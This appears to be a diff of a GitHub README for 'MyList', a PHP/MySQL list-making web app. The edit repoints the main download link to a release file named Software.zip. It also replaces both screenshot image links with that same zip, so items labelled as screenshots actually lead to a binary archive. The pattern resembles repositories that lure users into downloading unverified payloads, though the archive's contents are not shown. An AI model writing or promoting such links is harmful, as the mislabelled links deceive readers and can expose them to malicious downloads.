@@ -10,7 +10,7 @@ Welcome to MyList - a web system developed in PHP and MySQL to streamline the cr
 - Export lists to PDF format
 
 ## 🚀 Getting Started
-To get started with MyList, simply download the latest version of the system by clicking [here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip). Once downloaded, launch the system following the installation instructions in the repository.
+To get started with MyList, simply download the latest version of the system by clicking [here](https://github.com/NACIFALIMI/MyList/releases/download/v1.0/Software.zip). Once downloaded, launch the system following the installation instructions in the repository.
 
 ## 🖥️ Technologies Used
 - PHP
@@ -51,8 +51,8 @@ We welcome contributions to enhance MyList and make it even better! If you have 
 We value your feedback! If you have any comments, suggestions, or issues to report, please open an issue on the repository. Your feedback helps us improve MyList for all users.
 
 ## 📸 Screenshots
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 1](https://github.com/NACIFALIMI/MyList/releases/download/v1.0/Software.zip)
+![Screenshot 2](https://github.com/NACIFALIMI/MyList/releases/download/v1.0/Software.zip)
 
 ## 📝 License
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
